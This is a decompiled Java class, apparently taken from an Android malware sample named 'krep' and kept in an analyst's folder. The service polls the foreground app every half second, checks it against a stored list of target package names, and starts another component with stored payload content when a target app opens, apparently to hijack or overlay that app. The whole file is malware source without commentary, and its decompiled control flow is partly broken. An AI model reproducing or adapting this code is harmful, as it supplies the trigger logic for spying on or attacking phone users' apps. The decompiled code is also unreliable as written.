package krep.itmtd.ywtjexf;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build.VERSION;
import android.os.IBinder;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class MasterInterceptor
  extends Service
{
  static String start = "off";
  final String LOG_TAG = "myLogs";
  
  public static void bee()
  {
    start = "on";
  }
  
  String[] getActivePackages()
  {
    Object localObject = (ActivityManager)getSystemService("activity");
    HashSet localHashSet = new HashSet();
    localObject = ((ActivityManager)localObject).getRunningAppProcesses().iterator();
    for (;;)
    {
      if (!((Iterator)localObject).hasNext()) {
        return (String[])localHashSet.toArray(new String[localHashSet.size()]);
      }
      ActivityManager.RunningAppProcessInfo localRunningAppProcessInfo = (ActivityManager.RunningAppProcessInfo)((Iterator)localObject).next();
      if (localRunningAppProcessInfo.importance == 100) {
        localHashSet.addAll(Arrays.asList(localRunningAppProcessInfo.pkgList));
      }
    }
  }
  
  String[] getActivePackagesCompat()
  {
    return new String[] { ((ActivityManager.RunningTaskInfo)((ActivityManager)getSystemService("activity")).getRunningTasks(1).get(0)).topActivity.getPackageName() };
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    new RefreshTask().execute(new Object[0]);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    return 3;
  }
  
  class RefreshTask
    extends AsyncTask
  {
    private boolean someCondition = true;
    private String tectec = "";
    
    RefreshTask() {}
    
    protected Object doInBackground(Object... paramVarArgs)
    {
      if (!this.someCondition) {
        return null;
      }
      for (;;)
      {
        int i;
        try
        {
          Thread.sleep(500L);
          Map localMap = MasterInterceptor.this.getSharedPreferences("interceptor", 0).getAll();
          paramVarArgs = (ActivityManager)MasterInterceptor.this.getApplicationContext().getSystemService("activity");
          Object localObject;
          Iterator localIterator;
          if (Build.VERSION.SDK_INT > 20)
          {
            paramVarArgs = MasterInterceptor.this.getActivePackages();
            if (paramVarArgs == null) {
              break;
            }
            int j = paramVarArgs.length;
            i = 0;
            if (i >= j) {
              break;
            }
            localObject = paramVarArgs[i];
            if (localMap.size() <= 0) {
              break label259;
            }
            localIterator = localMap.keySet().iterator();
            if (localIterator.hasNext()) {
              continue;
            }
            break label259;
          }
          paramVarArgs = MasterInterceptor.this.getActivePackagesCompat();
          continue;
          String str = (String)localIterator.next();
          if (((String)localObject).contains(str))
          {
            if (this.tectec.contains((CharSequence)localObject)) {
              continue;
            }
            this.tectec = ((String)localObject);
            Intent localIntent = new Intent(MasterInterceptor.this.getApplicationContext(), GlobalCode.class);
            localIntent.putExtra("content", (String)localMap.get(str));
            localIntent.putExtra("type", "start");
            localIntent.putExtra("data", "");
            MasterInterceptor.this.startService(localIntent);
            continue;
          }
        }
        catch (InterruptedException paramVarArgs)
        {
          paramVarArgs.printStackTrace();
        }
        this.tectec = "";
        continue;
        label259:
        i += 1;
      }
    }
    
    protected void onProgressUpdate(Object... paramVarArgs)
    {
      super.onProgressUpdate(paramVarArgs);
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MasterInterceptor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */